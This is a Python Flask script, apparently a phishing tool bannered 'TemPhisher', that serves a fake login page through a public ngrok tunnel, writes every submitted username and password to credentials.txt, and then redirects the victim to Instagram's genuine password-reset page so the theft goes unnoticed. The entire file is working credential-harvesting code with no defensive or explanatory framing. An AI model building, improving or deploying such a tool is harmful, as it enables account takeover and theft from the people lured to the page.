import os
import requests
from flask import Flask, render_template, redirect, request, send_from_directory
from pyngrok import ngrok

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        
        # Store credentials in a local file (Note: This is insecure for real applications)
        with open('credentials.txt', 'a') as f:
            f.write(f"Username: {username}, Password: {password}\n")
        
        # Redirect to Instagram page
        return redirect('https://www.instagram.com/accounts/password/reset/')
    
    return render_template('index.html')

@app.route('/redirect_to_facebook', methods=['POST'])
def redirect_to_facebook():
    return redirect('https://www.facebook.com/')

@app.route('/static/<path:path>')
def send_static(path):
    return send_from_directory('static', path)

def display_logo():
    logo = """
     _____             ______ _     _     _               
    |_   _|            | ___ \ |   (_)   | |              
      | | ___ _ __ ___ | |_/ / |__  _ ___| |__   ___ _ __ 
      | |/ _ \ '_ ` _ \|  __/| '_ \| / __| '_ \ / _ \ '__|
      | |  __/ | | | | | |   | | | | \__ \ | | |  __/ |   
      \_/\___|_| |_| |_\_|   |_| |_|_|___/_| |_|\___|_|   
    """
    print(logo)

def interactive_menu():
    display_logo()
    print("*************************************")
    print("1. Start server")
    print("2. Exit")
    print("*************************************")
    choice = input("Enter your choice: ")
    return choice

def start_server():
    port = input("Enter the port number you want to use (e.g., 5000): ")
    
    try:
        port = int(port)
    except ValueError:
        print("Invalid port number. Please enter a valid integer.")
        return
    
    subdomain = input("Enter the desired subdomain for ngrok (or leave blank for a random subdomain): ")

    if not os.path.exists('templates/index.html'):
        print("index.html file not found in the 'templates' directory. Please make sure it's there.")
        return
    
    # Start ngrok tunnel
    if subdomain:
        public_url = ngrok.connect(port, subdomain=subdomain)
    else:
        public_url = ngrok.connect(port)
    
    print(f" * ngrok tunnel opened at {public_url}")
    
    app.run(port=port)

if __name__ == "__main__":
    while True:
        choice = interactive_menu()
        if choice == '1':
            start_server()
        elif choice == '2':
            print("Exiting...")
            break
        else:
            print("Invalid choice. Please select a valid option.")
